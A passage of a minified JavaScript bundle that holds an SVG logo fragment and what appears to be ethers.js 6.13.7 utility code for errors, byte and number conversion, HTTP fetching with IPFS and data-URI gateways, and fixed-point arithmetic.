  <path d="M9.3335 4.66667C9.3335 2.08934 11.4229 0 14.0002 0H20.6669C23.2442 0 25.3335 2.08934 25.3335 4.66667V11.3333C25.3335 13.9106 23.2442 16 20.6669 16H14.0002C11.4229 16 9.3335 13.9106 9.3335 11.3333V4.66667Z" fill="#363636"/>
  <path d="M15.6055 11.0003L17.9448 4.66699H18.6316L16.2923 11.0003H15.6055Z" fill="#F6F6F6"/>
  <path d="M0 4.33333C0 1.9401 1.9401 0 4.33333 0C6.72657 0 8.66669 1.9401 8.66669 4.33333V11.6667C8.66669 14.0599 6.72657 16 4.33333 16C1.9401 16 0 14.0599 0 11.6667V4.33333Z" fill="#363636"/>
  <path d="M3.9165 9.99934V9.16602H4.74983V9.99934H3.9165Z" fill="#F6F6F6"/>
  <path d="M26 8C26 3.58172 29.3517 0 33.4863 0H52.5137C56.6483 0 60 3.58172 60 8C60 12.4183 56.6483 16 52.5137 16H33.4863C29.3517 16 26 12.4183 26 8Z" fill="#363636"/>
  <path d="M49.3687 9.95834V6.26232H50.0213V6.81966C50.256 6.40899 50.7326 6.16699 51.2606 6.16699C52.0599 6.16699 52.6173 6.67299 52.6173 7.65566V9.95834H51.972V7.69234C51.972 7.04696 51.6053 6.70966 51.07 6.70966C50.4906 6.70966 50.0213 7.17168 50.0213 7.82433V9.95834H49.3687Z" fill="#F6F6F6"/>
  <path d="M45.2538 9.95773L44.5718 6.26172H45.1877L45.6717 9.31242L46.3098 7.30306H46.9184L47.5491 9.29041L48.0404 6.26172H48.6564L47.9744 9.95773H47.2411L46.6178 8.03641L45.9871 9.95773H45.2538Z" fill="#F6F6F6"/>
  <path d="M42.3709 10.0536C41.2489 10.0536 40.5889 9.21765 40.5889 8.1103C40.5889 7.01035 41.2489 6.16699 42.3709 6.16699C43.4929 6.16699 44.1529 7.01035 44.1529 8.1103C44.1529 9.21765 43.4929 10.0536 42.3709 10.0536ZM42.3709 9.51096C43.1775 9.51096 43.4856 8.82164 43.4856 8.10296C43.4856 7.39163 43.1775 6.70966 42.3709 6.70966C41.5642 6.70966 41.2562 7.39163 41.2562 8.10296C41.2562 8.82164 41.5642 9.51096 42.3709 9.51096Z" fill="#F6F6F6"/>
  <path d="M38.2805 10.0536C37.1952 10.0536 36.5132 9.22499 36.5132 8.1103C36.5132 7.00302 37.1952 6.16699 38.2805 6.16699C39.1972 6.16699 40.0038 6.68766 39.9159 8.27896H37.1805C37.2319 8.96103 37.5472 9.5183 38.2805 9.5183C38.7718 9.5183 39.0945 9.21765 39.2045 8.87299H39.8499C39.7472 9.48903 39.1679 10.0536 38.2805 10.0536ZM37.1952 7.78765H39.2852C39.2338 7.04696 38.8892 6.70232 38.2805 6.70232C37.6132 6.70232 37.2832 7.18635 37.1952 7.78765Z" fill="#F6F6F6"/>
  <path d="M33.3828 9.95773V6.26172H34.0501V6.88506C34.2848 6.47439 34.6882 6.26172 35.1061 6.26172H35.9935V6.88506H35.0548C34.4682 6.88506 34.0501 7.26638 34.0501 8.00706V9.95773H33.3828Z" fill="#F6F6F6"/>
</svg>`;var wY=Object.freeze({__proto__:null,reownSvg:gY});const mY="6.13.7";function yY(t,e,r){const n=e.split("|").map(s=>s.trim());for(let s=0;s<n.length;s++)switch(e){case"any":return;case"bigint":case"boolean":case"number":case"string":if(typeof t===e)return}const i=new Error(`invalid value for type ${e}`);throw i.code="INVALID_ARGUMENT",i.argument=`value.${r}`,i.value=t,i}async function Ar(t){const e=Object.keys(t);return(await Promise.all(e.map(n=>Promise.resolve(t[n])))).reduce((n,i,s)=>(n[e[s]]=i,n),{})}function Ce(t,e,r){for(let n in e){let i=e[n];const s=r?r[n]:null;s&&yY(i,s,n),Object.defineProperty(t,n,{enumerable:!0,value:i,writable:!1})}}function Ll(t){if(t==null)return"null";if(Array.isArray(t))return"[ "+t.map(Ll).join(", ")+" ]";if(t instanceof Uint8Array){const e="0123456789abcdef";let r="0x";for(let n=0;n<t.length;n++)r+=e[t[n]>>4],r+=e[t[n]&15];return r}if(typeof t=="object"&&typeof t.toJSON=="function")return Ll(t.toJSON());switch(typeof t){case"boolean":case"symbol":return t.toString();case"bigint":return BigInt(t).toString();case"number":return t.toString();case"string":return JSON.stringify(t);case"object":{const e=Object.keys(t);return e.sort(),"{ "+e.map(r=>`${Ll(r)}: ${Ll(t[r])}`).join(", ")+" }"}}return"[ COULD NOT SERIALIZE ]"}function or(t,e){return t&&t.code===e}function I2(t){return or(t,"CALL_EXCEPTION")}function Et(t,e,r){let n=t;{const s=[];if(r){if("message"in r||"code"in r||"name"in r)throw new Error(`value will overwrite populated values: ${Ll(r)}`);for(const o in r){if(o==="shortMessage")continue;const a=r[o];s.push(o+"="+Ll(a))}}s.push(`code=${e}`),s.push(`version=${mY}`),s.length&&(t+=" ("+s.join(", ")+")")}let i;switch(e){case"INVALID_ARGUMENT":i=new TypeError(t);break;case"NUMERIC_FAULT":case"BUFFER_OVERRUN":i=new RangeError(t);break;default:i=new Error(t)}return Ce(i,{code:e}),r&&Object.assign(i,r),i.shortMessage==null&&Ce(i,{shortMessage:n}),i}function K(t,e,r,n){if(!t)throw Et(e,r,n)}function M(t,e,r,n){K(t,e,"INVALID_ARGUMENT",{argument:r,value:n})}function Z9(t,e,r){r==null&&(r=""),r&&(r=": "+r),K(t>=e,"missing argument"+r,"MISSING_ARGUMENT",{count:t,expectedCount:e}),K(t<=e,"too many arguments"+r,"UNEXPECTED_ARGUMENT",{count:t,expectedCount:e})}["NFD","NFC","NFKD","NFKC"].reduce((t,e)=>{try{if("test".normalize(e)!=="test")throw new Error("bad");if(e==="NFD"&&"".normalize("NFD")!=="e")throw new Error("broken");t.push(e)}catch{}return t},[]);function sp(t,e,r){if(r==null&&(r=""),t!==e){let n=r,i="new";r&&(n+=".",i+=" "+r),K(!1,`private constructor; use ${n}from* methods`,"UNSUPPORTED_OPERATION",{operation:i})}}function J9(t,e,r){if(t instanceof Uint8Array)return r?new Uint8Array(t):t;if(typeof t=="string"&&t.match(/^0x(?:[0-9a-f][0-9a-f])*$/i)){const n=new Uint8Array((t.length-2)/2);let i=2;for(let s=0;s<n.length;s++)n[s]=parseInt(t.substring(i,i+2),16),i+=2;return n}M(!1,"invalid BytesLike value",e||"value",t)}function Ve(t,e){return J9(t,e,!1)}function xr(t,e){return J9(t,e,!0)}function gt(t,e){return!(typeof t!="string"||!t.match(/^0x[0-9A-Fa-f]*$/)||typeof e=="number"&&t.length!==2+2*e||e===!0&&t.length%2!==0)}function S2(t){return gt(t,!0)||t instanceof Uint8Array}const D8="0123456789abcdef";function ue(t){const e=Ve(t);let r="0x";for(let n=0;n<e.length;n++){const i=e[n];r+=D8[(i&240)>>4]+D8[i&15]}return r}function Ot(t){return"0x"+t.map(e=>ue(e).substring(2)).join("")}function Wl(t){return gt(t,!0)?(t.length-2)/2:Ve(t).length}function Ct(t,e,r){const n=Ve(t);return r!=null&&r>n.length&&K(!1,"cannot slice beyond data bounds","BUFFER_OVERRUN",{buffer:n,length:n.length,offset:r}),ue(n.slice(e??0,r??n.length))}function Q9(t,e,r){const n=Ve(t);K(e>=n.length,"padding exceeds data length","BUFFER_OVERRUN",{buffer:new Uint8Array(n),length:e,offset:e+1});const i=new Uint8Array(e);return i.fill(0),r?i.set(n,e-n.length):i.set(n,0),ue(i)}function kc(t,e){return Q9(t,e,!0)}function bY(t,e){return Q9(t,e,!1)}const w1=BigInt(0),li=BigInt(1),Gy=9007199254740991;function yg(t,e){const r=m1(t,"value"),n=BigInt(Re(e,"width"));if(K(r>>n===w1,"overflow","NUMERIC_FAULT",{operation:"fromTwos",fault:"overflow",value:t}),r>>n-li){const i=(li<<n)-li;return-((~r&i)+li)}return r}function Y9(t,e){let r=ge(t,"value");const n=BigInt(Re(e,"width")),i=li<<n-li;if(r<w1){r=-r,K(r<=i,"too low","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});const s=(li<<n)-li;return(~r&s)+li}else K(r<i,"too high","NUMERIC_FAULT",{operation:"toTwos",fault:"overflow",value:t});return r}function Ba(t,e){const r=m1(t,"value"),n=BigInt(Re(e,"bits"));return r&(li<<n)-li}function ge(t,e){switch(typeof t){case"bigint":return t;case"number":return M(Number.isInteger(t),"underflow",e||"value",t),M(t>=-9007199254740991&&t<=Gy,"overflow",e||"value",t),BigInt(t);case"string":try{if(t==="")throw new Error("empty string");return t[0]==="-"&&t[1]!=="-"?-BigInt(t.substring(1)):BigInt(t)}catch(r){M(!1,`invalid BigNumberish string: ${r.message}`,e||"value",t)}}M(!1,"invalid BigNumberish value",e||"value",t)}function m1(t,e){const r=ge(t,e);return K(r>=w1,"unsigned value cannot be negative","NUMERIC_FAULT",{fault:"overflow",operation:"getUint",value:t}),r}const B8="0123456789abcdef";function y1(t){if(t instanceof Uint8Array){let e="0x0";for(const r of t)e+=B8[r>>4],e+=B8[r&15];return BigInt(e)}return ge(t)}function Re(t,e){switch(typeof t){case"bigint":return M(t>=-9007199254740991&&t<=Gy,"overflow",e||"value",t),Number(t);case"number":return M(Number.isInteger(t),"underflow",e||"value",t),M(t>=-9007199254740991&&t<=Gy,"overflow",e||"value",t),t;case"string":try{if(t==="")throw new Error("empty string");return Re(BigInt(t),e)}catch(r){M(!1,`invalid numeric string: ${r.message}`,e||"value",t)}}M(!1,"invalid numeric value",e||"value",t)}function vY(t){return Re(y1(t))}function qo(t,e){let n=m1(t,"value").toString(16);if(e==null)n.length%2&&(n="0"+n);else{const i=Re(e,"width");for(K(i*2>=n.length,`value exceeds width (${i} bytes)`,"NUMERIC_FAULT",{operation:"toBeHex",fault:"overflow",value:t});n.length<i*2;)n="0"+n}return"0x"+n}function Ir(t){const e=m1(t,"value");if(e===w1)return new Uint8Array([]);let r=e.toString(16);r.length%2&&(r="0"+r);const n=new Uint8Array(r.length/2);for(let i=0;i<n.length;i++){const s=i*2;n[i]=parseInt(r.substring(s,s+2),16)}return n}function Ul(t){let e=ue(S2(t)?t:Ir(t)).substring(2);for(;e.startsWith("0");)e=e.substring(1);return e===""&&(e="0"),"0x"+e}const L8="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";BigInt(0);const U8=BigInt(58);function EY(t){const e=Ve(t);let r=y1(e),n="";for(;r;)n=L8[Number(r%U8)]+n,r/=U8;for(let i=0;i<e.length&&!e[i];i++)n=L8[0]+n;return n}function CY(t){t=atob(t);const e=new Uint8Array(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return Ve(e)}function AY(t){const e=Ve(t);let r="";for(let n=0;n<e.length;n++)r+=String.fromCharCode(e[n]);return btoa(r)}var Jl;class X9{constructor(e,r,n){j(this,"filter");j(this,"emitter");H(this,Jl);$(this,Jl,r),Ce(this,{emitter:e,filter:n})}async removeListener(){A(this,Jl)!=null&&await this.emitter.off(this.filter,A(this,Jl))}}Jl=new WeakMap;function xY(t,e,r,n,i){M(!1,`invalid codepoint at offset ${e}; ${t}`,"bytes",r)}function ex(t,e,r,n,i){if(t==="BAD_PREFIX"||t==="UNEXPECTED_CONTINUE"){let s=0;for(let o=e+1;o<r.length&&r[o]>>6===2;o++)s++;return s}return t==="OVERRUN"?r.length-e-1:0}function IY(t,e,r,n,i){return t==="OVERLONG"?(M(typeof i=="number","invalid bad code point for replacement","badCodepoint",i),n.push(i),0):(n.push(65533),ex(t,e,r))}const SY=Object.freeze({error:xY,ignore:ex,replace:IY});function NY(t,e){e==null&&(e=SY.error);const r=Ve(t,"bytes"),n=[];let i=0;for(;i<r.length;){const s=r[i++];if(s>>7===0){n.push(s);continue}let o=null,a=null;if((s&224)===192)o=1,a=127;else if((s&240)===224)o=2,a=2047;else if((s&248)===240)o=3,a=65535;else{(s&192)===128?i+=e("UNEXPECTED_CONTINUE",i-1,r,n):i+=e("BAD_PREFIX",i-1,r,n);continue}if(i-1+o>=r.length){i+=e("OVERRUN",i-1,r,n);continue}let c=s&(1<<8-o-1)-1;for(let l=0;l<o;l++){let u=r[i];if((u&192)!=128){i+=e("MISSING_CONTINUE",i,r,n),c=null;break}c=c<<6|u&63,i++}if(c!==null){if(c>1114111){i+=e("OUT_OF_RANGE",i-1-o,r,n,c);continue}if(c>=55296&&c<=57343){i+=e("UTF16_SURROGATE",i-1-o,r,n,c);continue}if(c<=a){i+=e("OVERLONG",i-1-o,r,n,c);continue}n.push(c)}}return n}function Fs(t,e){M(typeof t=="string","invalid string value","str",t);let r=[];for(let n=0;n<t.length;n++){const i=t.charCodeAt(n);if(i<128)r.push(i);else if(i<2048)r.push(i>>6|192),r.push(i&63|128);else if((i&64512)==55296){n++;const s=t.charCodeAt(n);M(n<t.length&&(s&64512)===56320,"invalid surrogate pair","str",t);const o=65536+((i&1023)<<10)+(s&1023);r.push(o>>18|240),r.push(o>>12&63|128),r.push(o>>6&63|128),r.push(o&63|128)}else r.push(i>>12|224),r.push(i>>6&63|128),r.push(i&63|128)}return new Uint8Array(r)}function PY(t){return t.map(e=>e<=65535?String.fromCharCode(e):(e-=65536,String.fromCharCode((e>>10&1023)+55296,(e&1023)+56320))).join("")}function bg(t,e){return PY(NY(t,e))}function tx(t){async function e(r,n){K(n==null||!n.cancelled,"request cancelled before sending","CANCELLED");const i=r.url.split(":")[0].toLowerCase();K(i==="http"||i==="https",`unsupported protocol ${i}`,"UNSUPPORTED_OPERATION",{info:{protocol:i},operation:"request"}),K(i==="https"||!r.credentials||r.allowInsecureAuthentication,"insecure authorized connections unsupported","UNSUPPORTED_OPERATION",{operation:"request"});let s=null;const o=new AbortController,a=setTimeout(()=>{s=Et("request timeout","TIMEOUT"),o.abort()},r.timeout);n&&n.addListener(()=>{s=Et("request cancelled","CANCELLED"),o.abort()});const c={method:r.method,headers:new Headers(Array.from(r)),body:r.body||void 0,signal:o.signal};let l;try{l=await fetch(r.url,c)}catch(f){throw clearTimeout(a),s||f}clearTimeout(a);const u={};l.headers.forEach((f,g)=>{u[g.toLowerCase()]=f});const h=await l.arrayBuffer(),d=h==null?null:new Uint8Array(h);return{statusCode:l.status,statusMessage:l.statusText,headers:u,body:d}}return e}const kY=12,OY=250;let M8=tx();const _Y=new RegExp("^data:([^;:]*)?(;base64)?,(.*)$","i"),TY=new RegExp("^ipfs://(ipfs/)?(.*)$","i");let vm=!1;async function rx(t,e){try{const r=t.match(_Y);if(!r)throw new Error("invalid data");return new jo(200,"OK",{"content-type":r[1]||"text/plain"},r[2]?CY(r[3]):RY(r[3]))}catch{return new jo(599,"BAD REQUEST (invalid data: URI)",{},null,new Vo(t))}}function nx(t){async function e(r,n){try{const i=r.match(TY);if(!i)throw new Error("invalid link");return new Vo(`${t}${i[2]}`)}catch{return new jo(599,"BAD REQUEST (invalid IPFS URI)",{},null,new Vo(r))}}return e}const b0={data:rx,ipfs:nx("https://gateway.ipfs.io/ipfs/")},ix=new WeakMap;var Fa,go;class $Y{constructor(e){H(this,Fa);H(this,go);$(this,Fa,[]),$(this,go,!1),ix.set(e,()=>{if(!A(this,go)){$(this,go,!0);for(const r of A(this,Fa))setTimeout(()=>{r()},0);$(this,Fa,[])}})}addListener(e){K(!A(this,go),"singal already cancelled","UNSUPPORTED_OPERATION",{operation:"fetchCancelSignal.addCancelListener"}),A(this,Fa).push(e)}get cancelled(){return A(this,go)}checkSignal(){K(!this.cancelled,"cancelled","CANCELLED",{})}}Fa=new WeakMap,go=new WeakMap;function v0(t){if(t==null)throw new Error("missing signal; should not happen");return t.checkSignal(),t}var Ql,Yl,ii,vs,Xl,eu,Ht,cn,Es,za,ja,Ha,_i,si,wo,qa,pd;const Tg=class Tg{constructor(e){H(this,qa);H(this,Ql);H(this,Yl);H(this,ii);H(this,vs);H(this,Xl);H(this,eu);H(this,Ht);H(this,cn);H(this,Es);H(this,za);H(this,ja);H(this,Ha);H(this,_i);H(this,si);H(this,wo);$(this,eu,String(e)),$(this,Ql,!1),$(this,Yl,!0),$(this,ii,{}),$(this,vs,""),$(this,Xl,3e5),$(this,si,{slotInterval:OY,maxAttempts:kY}),$(this,wo,null)}get url(){return A(this,eu)}set url(e){$(this,eu,String(e))}get body(){return A(this,Ht)==null?null:new Uint8Array(A(this,Ht))}set body(e){if(e==null)$(this,Ht,void 0),$(this,cn,void 0);else if(typeof e=="string")$(this,Ht,Fs(e)),$(this,cn,"text/plain");else if(e instanceof Uint8Array)$(this,Ht,e),$(this,cn,"application/octet-stream");else if(typeof e=="object")$(this,Ht,Fs(JSON.stringify(e))),$(this,cn,"application/json");else throw new Error("invalid body")}hasBody(){return A(this,Ht)!=null}get method(){return A(this,vs)?A(this,vs):this.hasBody()?"POST":"GET"}set method(e){e==null&&(e=""),$(this,vs,String(e).toUpperCase())}get headers(){const e=Object.assign({},A(this,ii));return A(this,Es)&&(e.authorization=`Basic ${AY(Fs(A(this,Es)))}`),this.allowGzip&&(e["accept-encoding"]="gzip"),e["content-type"]==null&&A(this,cn)&&(e["content-type"]=A(this,cn)),this.body&&(e["content-length"]=String(this.body.length)),e}getHeader(e){return this.headers[e.toLowerCase()]}setHeader(e,r){A(this,ii)[String(e).toLowerCase()]=String(r)}clearHeaders(){$(this,ii,{})}[Symbol.iterator](){const e=this.headers,r=Object.keys(e);let n=0;return{next:()=>{if(n<r.length){const i=r[n++];return{value:[i,e[i]],done:!1}}return{value:void 0,done:!0}}}}get credentials(){return A(this,Es)||null}setCredentials(e,r){M(!e.match(/:/),"invalid basic authentication username","username","[REDACTED]"),$(this,Es,`${e}:${r}`)}get allowGzip(){return A(this,Yl)}set allowGzip(e){$(this,Yl,!!e)}get allowInsecureAuthentication(){return!!A(this,Ql)}set allowInsecureAuthentication(e){$(this,Ql,!!e)}get timeout(){return A(this,Xl)}set timeout(e){M(e>=0,"timeout must be non-zero","timeout",e),$(this,Xl,e)}get preflightFunc(){return A(this,za)||null}set preflightFunc(e){$(this,za,e)}get processFunc(){return A(this,ja)||null}set processFunc(e){$(this,ja,e)}get retryFunc(){return A(this,Ha)||null}set retryFunc(e){$(this,Ha,e)}get getUrlFunc(){return A(this,wo)||M8}set getUrlFunc(e){$(this,wo,e)}toString(){return`<FetchRequest method=${JSON.stringify(this.method)} url=${JSON.stringify(this.url)} headers=${JSON.stringify(this.headers)} body=${A(this,Ht)?ue(A(this,Ht)):"null"}>`}setThrottleParams(e){e.slotInterval!=null&&(A(this,si).slotInterval=e.slotInterval),e.maxAttempts!=null&&(A(this,si).maxAttempts=e.maxAttempts)}send(){return K(A(this,_i)==null,"request already sent","UNSUPPORTED_OPERATION",{operation:"fetchRequest.send"}),$(this,_i,new $Y(this)),Q(this,qa,pd).call(this,0,F8()+this.timeout,0,this,new jo(0,"",{},null,this))}cancel(){K(A(this,_i)!=null,"request has not been sent","UNSUPPORTED_OPERATION",{operation:"fetchRequest.cancel"});const e=ix.get(this);if(!e)throw new Error("missing signal; should not happen");e()}redirect(e){const r=this.url.split(":")[0].toLowerCase(),n=e.split(":")[0].toLowerCase();K(this.method==="GET"&&(r!=="https"||n!=="http")&&e.match(/^https?:/),"unsupported redirect","UNSUPPORTED_OPERATION",{operation:`redirect(${this.method} ${JSON.stringify(this.url)} => ${JSON.stringify(e)})`});const i=new Tg(e);return i.method="GET",i.allowGzip=this.allowGzip,i.timeout=this.timeout,$(i,ii,Object.assign({},A(this,ii))),A(this,Ht)&&$(i,Ht,new Uint8Array(A(this,Ht))),$(i,cn,A(this,cn)),i}clone(){const e=new Tg(this.url);return $(e,vs,A(this,vs)),A(this,Ht)&&$(e,Ht,A(this,Ht)),$(e,cn,A(this,cn)),$(e,ii,Object.assign({},A(this,ii))),$(e,Es,A(this,Es)),this.allowGzip&&(e.allowGzip=!0),e.timeout=this.timeout,this.allowInsecureAuthentication&&(e.allowInsecureAuthentication=!0),$(e,za,A(this,za)),$(e,ja,A(this,ja)),$(e,Ha,A(this,Ha)),$(e,si,Object.assign({},A(this,si))),$(e,wo,A(this,wo)),e}static lockConfig(){vm=!0}static getGateway(e){return b0[e.toLowerCase()]||null}static registerGateway(e,r){if(e=e.toLowerCase(),e==="http"||e==="https")throw new Error(`cannot intercept ${e}; use registerGetUrl`);if(vm)throw new Error("gateways locked");b0[e]=r}static registerGetUrl(e){if(vm)throw new Error("gateways locked");M8=e}static createGetUrlFunc(e){return tx()}static createDataGateway(){return rx}static createIpfsGatewayFunc(e){return nx(e)}};Ql=new WeakMap,Yl=new WeakMap,ii=new WeakMap,vs=new WeakMap,Xl=new WeakMap,eu=new WeakMap,Ht=new WeakMap,cn=new WeakMap,Es=new WeakMap,za=new WeakMap,ja=new WeakMap,Ha=new WeakMap,_i=new WeakMap,si=new WeakMap,wo=new WeakMap,qa=new WeakSet,pd=async function(e,r,n,i,s){var u,h,d;if(e>=A(this,si).maxAttempts)return s.makeServerError("exceeded maximum retry limit");K(F8()<=r,"timeout","TIMEOUT",{operation:"request.send",reason:"timeout",request:i}),n>0&&await DY(n);let o=this.clone();const a=(o.url.split(":")[0]||"").toLowerCase();if(a in b0){const f=await b0[a](o.url,v0(A(i,_i)));if(f instanceof jo){let g=f;if(this.processFunc){v0(A(i,_i));try{g=await this.processFunc(o,g)}catch(p){(p.throttle==null||typeof p.stall!="number")&&g.makeServerError("error in post-processing function",p).assertOk()}}return g}o=f}this.preflightFunc&&(o=await this.preflightFunc(o));const c=await this.getUrlFunc(o,v0(A(i,_i)));let l=new jo(c.statusCode,c.statusMessage,c.headers,c.body,i);if(l.statusCode===301||l.statusCode===302){try{const f=l.headers.location||"";return Q(u=o.redirect(f),qa,pd).call(u,e+1,r,0,i,l)}catch{}return l}else if(l.statusCode===429&&(this.retryFunc==null||await this.retryFunc(o,l,e))){const f=l.headers["retry-after"];let g=A(this,si).slotInterval*Math.trunc(Math.random()*Math.pow(2,e));return typeof f=="string"&&f.match(/^[1-9][0-9]*$/)&&(g=parseInt(f)),Q(h=o.clone(),qa,pd).call(h,e+1,r,g,i,l)}if(this.processFunc){v0(A(i,_i));try{l=await this.processFunc(o,l)}catch(f){(f.throttle==null||typeof f.stall!="number")&&l.makeServerError("error in post-processing function",f).assertOk();let g=A(this,si).slotInterval*Math.trunc(Math.random()*Math.pow(2,e));return f.stall>=0&&(g=f.stall),Q(d=o.clone(),qa,pd).call(d,e+1,r,g,i,l)}}return l};let Vo=Tg;var If,Sf,Nf,ln,tu,Va;const G2=class G2{constructor(e,r,n,i,s){H(this,If);H(this,Sf);H(this,Nf);H(this,ln);H(this,tu);H(this,Va);$(this,If,e),$(this,Sf,r),$(this,Nf,Object.keys(n).reduce((o,a)=>(o[a.toLowerCase()]=String(n[a]),o),{})),$(this,ln,i==null?null:new Uint8Array(i)),$(this,tu,s||null),$(this,Va,{message:""})}toString(){return`<FetchResponse status=${this.statusCode} body=${A(this,ln)?ue(A(this,ln)):"null"}>`}get statusCode(){return A(this,If)}get statusMessage(){return A(this,Sf)}get headers(){return Object.assign({},A(this,Nf))}get body(){return A(this,ln)==null?null:new Uint8Array(A(this,ln))}get bodyText(){try{return A(this,ln)==null?"":bg(A(this,ln))}catch{K(!1,"response body is not valid UTF-8 data","UNSUPPORTED_OPERATION",{operation:"bodyText",info:{response:this}})}}get bodyJson(){try{return JSON.parse(this.bodyText)}catch{K(!1,"response body is not valid JSON","UNSUPPORTED_OPERATION",{operation:"bodyJson",info:{response:this}})}}[Symbol.iterator](){const e=this.headers,r=Object.keys(e);let n=0;return{next:()=>{if(n<r.length){const i=r[n++];return{value:[i,e[i]],done:!1}}return{value:void 0,done:!0}}}}makeServerError(e,r){let n;e?n=`CLIENT ESCALATED SERVER ERROR (${this.statusCode} ${this.statusMessage}; ${e})`:(e=`${this.statusCode} ${this.statusMessage}`,n=`CLIENT ESCALATED SERVER ERROR (${e})`);const i=new G2(599,n,this.headers,this.body,A(this,tu)||void 0);return $(i,Va,{message:e,error:r}),i}throwThrottleError(e,r){r==null?r=-1:M(Number.isInteger(r)&&r>=0,"invalid stall timeout","stall",r);const n=new Error(e||"throttling requests");throw Ce(n,{stall:r,throttle:!0}),n}getHeader(e){return this.headers[e.toLowerCase()]}hasBody(){return A(this,ln)!=null}get request(){return A(this,tu)}ok(){return A(this,Va).message===""&&this.statusCode>=200&&this.statusCode<300}assertOk(){if(this.ok())return;let{message:e,error:r}=A(this,Va);e===""&&(e=`server response ${this.statusCode} ${this.statusMessage}`);let n=null;this.request&&(n=this.request.url);let i=null;try{A(this,ln)&&(i=bg(A(this,ln)))}catch{}K(!1,e,"SERVER_ERROR",{request:this.request||"unknown request",response:this,error:r,info:{requestUrl:n,responseBody:i,responseStatus:`${this.statusCode} ${this.statusMessage}`}})}};If=new WeakMap,Sf=new WeakMap,Nf=new WeakMap,ln=new WeakMap,tu=new WeakMap,Va=new WeakMap;let jo=G2;function F8(){return new Date().getTime()}function RY(t){return Fs(t.replace(/%([0-9a-f][0-9a-f])/gi,(e,r)=>String.fromCharCode(parseInt(r,16))))}function DY(t){return new Promise(e=>setTimeout(e,t))}const BY=BigInt(-1),ei=BigInt(0),Ml=BigInt(1),LY=BigInt(5),wl={};let Gl="0000";for(;Gl.length<80;)Gl+=Gl;function wa(t){let e=Gl;for(;e.length<t;)e+=e;return BigInt("1"+e.substring(0,t))}function rd(t,e,r){const n=BigInt(e.width);if(e.signed){const i=Ml<<n-Ml;K(r==null||t>=-i&&t<i,"overflow","NUMERIC_FAULT",{operation:r,fault:"overflow",value:t}),t>ei?t=yg(Ba(t,n),n):t=-yg(Ba(-t,n),n)}else{const i=Ml<<n;K(r==null||t>=0&&t<i,"overflow","NUMERIC_FAULT",{operation:r,fault:"overflow",value:t}),t=(t%i+i)%i&i-Ml}return t}function Em(t){typeof t=="number"&&(t=`fixed128x${t}`);let e=!0,r=128,n=18;if(typeof t=="string"){if(t!=="fixed")if(t==="ufixed")e=!1;else{const s=t.match(/^(u?)fixed([0-9]+)x([0-9]+)$/);M(s,"invalid fixed format","format",t),e=s[1]!=="u",r=parseInt(s[2]),n=parseInt(s[3])}}else if(t){const s=t,o=(a,c,l)=>s[a]==null?l:(M(typeof s[a]===c,"invalid fixed format ("+a+" not "+c+")","format."+a,s[a]),s[a]);e=o("signed","boolean",e),r=o("width","number",r),n=o("decimals","number",n)}M(r%8===0,"invalid FixedNumber width (not byte aligned)","format.width",r),M(n<=80,"invalid FixedNumber decimals (too large)","format.decimals",n);const i=(e?"":"u")+"fixed"+String(r)+"x"+String(n);return{signed:e,width:r,decimals:n,name:i}}function UY(t,e){let r="";t<ei&&(r="-",t*=BY);let n=t.toString();if(e===0)return r+n;for(;n.length<=e;)n=Gl+n;const i=n.length-e;for(n=n.substring(0,i)+"."+n.substring(i);n[0]==="0"&&n[1]!==".";)n=n.substring(1);for(;n[n.length-1]==="0"&&n[n.length-2]!==".";)n=n.substring(0,n.length-1);return r+n}var oi,st,Er,et,va,fs,Zy,Jy,Qy,Yy;const ho=class ho{constructor(e,r,n){H(this,et);j(this,"format");H(this,oi);H(this,st);H(this,Er);j(this,"_value");sp(e,wl,"FixedNumber"),$(this,st,r),$(this,oi,n);const i=UY(r,n.decimals);Ce(this,{format:n.name,_value:i}),$(this,Er,wa(n.decimals))}get signed(){return A(this,oi).signed}get width(){return A(this,oi).width}get decimals(){return A(this,oi).decimals}get value(){return A(this,st)}addUnsafe(e){return Q(this,et,Zy).call(this,e)}add(e){return Q(this,et,Zy).call(this,e,"add")}subUnsafe(e){return Q(this,et,Jy).call(this,e)}sub(e){return Q(this,et,Jy).call(this,e,"sub")}mulUnsafe(e){return Q(this,et,Qy).call(this,e)}mul(e){return Q(this,et,Qy).call(this,e,"mul")}mulSignal(e){Q(this,et,va).call(this,e);const r=A(this,st)*A(e,st);return K(r%A(this,Er)===ei,"precision lost during signalling mul","NUMERIC_FAULT",{operation:"mulSignal",fault:"underflow",value:this}),Q(this,et,fs).call(this,r/A(this,Er),"mulSignal")}divUnsafe(e){return Q(this,et,Yy).call(this,e)}div(e){return Q(this,et,Yy).call(this,e,"div")}divSignal(e){K(A(e,st)!==ei,"division by zero","NUMERIC_FAULT",{operation:"div",fault:"divide-by-zero",value:this}),Q(this,et,va).call(this,e);const r=A(this,st)*A(this,Er);return K(r%A(e,st)===ei,"precision lost during signalling div","NUMERIC_FAULT",{operation:"divSignal",fault:"underflow",value:this}),Q(this,et,fs).call(this,r/A(e,st),"divSignal")}cmp(e){let r=this.value,n=e.value;const i=this.decimals-e.decimals;return i>0?n*=wa(i):i<0&&(r*=wa(-i)),r<n?-1:r>n?1:0}eq(e){return this.cmp(e)===0}lt(e){return this.cmp(e)<0}lte(e){return this.cmp(e)<=0}gt(e){return this.cmp(e)>0}gte(e){return this.cmp(e)>=0}floor(){let e=A(this,st);return A(this,st)<ei&&(e-=A(this,Er)-Ml),e=A(this,st)/A(this,Er)*A(this,Er),Q(this,et,fs).call(this,e,"floor")}ceiling(){let e=A(this,st);return A(this,st)>ei&&(e+=A(this,Er)-Ml),e=A(this,st)/A(this,Er)*A(this,Er),Q(this,et,fs).call(this,e,"ceiling")}round(e){if(e==null&&(e=0),e>=this.decimals)return this;const r=this.decimals-e,n=LY*wa(r-1);let i=this.value+n;const s=wa(r);return i=i/s*s,rd(i,A(this,oi),"round"),new ho(wl,i,A(this,oi))}isZero(){return A(this,st)===ei}isNegative(){return A(this,st)<ei}toString(){return this._value}toUnsafeFloat(){return parseFloat(this.toString())}toFormat(e){return ho.fromString(this.toString(),e)}static fromValue(e,r,n){const i=r==null?0:Re(r),s=Em(n);let o=ge(e,"value");const a=i-s.decimals;if(a>0){const c=wa(a);K(o%c===ei,"value loses precision for format","NUMERIC_FAULT",{operation:"fromValue",fault:"underflow",value:e}),o/=c}else a<0&&(o*=wa(-a));return rd(o,s,"fromValue"),new ho(wl,o,s)}static fromString(e,r){const 